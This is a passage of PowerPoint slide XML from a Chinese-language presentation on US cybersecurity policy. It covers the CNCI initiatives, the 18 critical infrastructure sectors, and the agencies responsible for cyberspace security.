                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>十二项提议</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可信互联网连接（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>TIC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</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网络入侵检测系统</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网络入侵防护系统</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科技研发</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态势感知</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网络反间</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增强涉密安全</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加强网络教育</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“超越未来（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Leap Ahead</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）”技术研发</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网络威慑战略</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全球供应链风险管理机制</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公私协作</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="731104"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>美国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CNCI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：网络“曼哈顿计划”</a:t>
            </a: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28184" y="1988840"/>
            <a:ext cx="2713040" cy="3937224"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="124007237"/>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900622" y="908720"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>美国信息安全保障的重点对象</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11268" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934244" y="1700808"/>
            <a:ext cx="7206952" cy="306970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dirty="0"/>
              <a:t>关键基础设施</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2001</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>年美国出台</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>美国爱国者法案</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>，定义“关键基础实施”的含义；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2003</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>月发布</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>国土安全总统令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>/HSPD-7》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>确定了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>17</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>个关键基础设施；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2008</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>月国土安全部将关键制造业类为第</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>18</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>项关键基础设施；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1564429793"/>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7504" y="1811442"/>
            <a:ext cx="4692590" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）信息技术；</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2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）电信；</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3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）化学制品；</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4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）商业设施；</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5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）大坝；</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6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）商用核反应堆、材料和废弃物；</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7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）政府设施；</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8</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）交通系统；</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9</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）应急服务；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4191000" y="1816002"/>
            <a:ext cx="4773488" cy="2862322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）邮政和货运服务；</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11</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）农业和食品；</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12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）饮用水和废水处理系统；</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13</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）公共健康和医疗；</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14</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）能源；</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15</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）银行和金融；</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16</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）国家纪念碑和象征性标志；（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>17</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）国防工业基地；</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18</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）关键制造业</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="239450" y="908720"/>
            <a:ext cx="6635150" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>目前美国关键基础设施和主要资源部门</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22384692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755576" y="677089"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>美国网络空间安全保障组织机构</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12292" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="518931" y="1270456"/>
            <a:ext cx="8191500" cy="1269848"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>网络安全协调官：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>   负责领导白宫“网络安全办公室”，制定和发布国家信息安全政策</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>（首任网络安全协调官霍华德</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>·</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>施密特，被喻为“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络沙皇</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>”）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="518931" y="2518587"/>
            <a:ext cx="8047484" cy="2209836"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>官方机构：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国土安全部（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>DHS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家安全局（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>NSA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国防部（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>DOD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>联邦调查局（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>FBI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>中央情况报局（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>CIA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家标准技术研究所（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>NIST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="4797152"/>
            <a:ext cx="5040560" cy="1286506"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
